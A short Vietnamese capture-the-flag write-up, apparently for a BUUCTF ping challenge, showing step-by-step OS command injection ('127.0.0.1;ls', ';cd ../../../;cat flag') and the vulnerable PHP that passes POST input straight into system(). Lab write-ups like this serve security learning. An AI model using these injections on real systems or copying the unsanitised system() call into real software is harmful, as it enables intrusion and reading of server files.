Ta có form challenge như sau

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/bd75f6ab-d523-4131-a1a9-718a24a6f396)

Mình thử nhập 127.0.0.1 vì bài có nhắc đến Ping.

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/38584d7c-7ba6-4ad3-a08e-27b22b01b6f4)

Kế đó sử dụng comand ls, `127.0.0.1;ls`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/f00098f9-35ef-4794-86a5-647a2a783096)

cat và viewsorce để xem file index.php

```php
<?php 
if (isset($_POST['target'])) {
	system("ping -c 3 ".$_POST['target']);
}
?>
```

Cũng không có gì dặc biệt lắm mình thử mò cd cho đến khi `;cd ../../../;ls`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/aaa57706-bcbe-4029-bad7-b226e718e847)

Sau đó ta chỉ cần cat vào là được lụm key, `;cd ../../../;cat flag`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/3bb6cbac-97dc-45fe-9557-4474848079f4)


